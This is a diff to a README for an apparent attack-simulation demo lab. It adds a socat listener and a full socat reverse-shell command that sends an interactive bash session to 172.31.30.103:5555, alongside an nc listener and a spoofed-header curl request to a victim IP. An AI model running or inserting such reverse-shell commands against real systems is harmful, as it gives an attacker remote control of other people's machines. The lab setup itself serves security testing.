@@ -68,6 +68,11 @@ sudo yum install screen    # RHEL/CentOS
 ```bash
 nc -k -l 3333 &
 ```
+**Create a new socat tcp listener on tcp 5555**
+
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:5555
+```
 
 **Run traffic simulation with k6 on Terminal 2 or screen 2:**
 ```bash
@@ -83,6 +88,10 @@ sudo docker run --rm -v $(pwd):/scripts grafana/k6 run /scripts/k6.js
 ./demo_simulator/lw_attack_sim.sh
 ```
 
+**Intiate an interactive Reverse Shell**
+```bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.31.30.103:5555
+```
 ---
 
 ## 🚀 HOWTO Use the Demo
@@ -144,3 +153,4 @@ curl -H "X-Forwarded-For: 1.2.3.4" http://<victim_IP>:5000/client-ip
 
 ## ✅ You're now ready to simulate attacks!
 Happy testing — use responsibly in isolated environments.
+
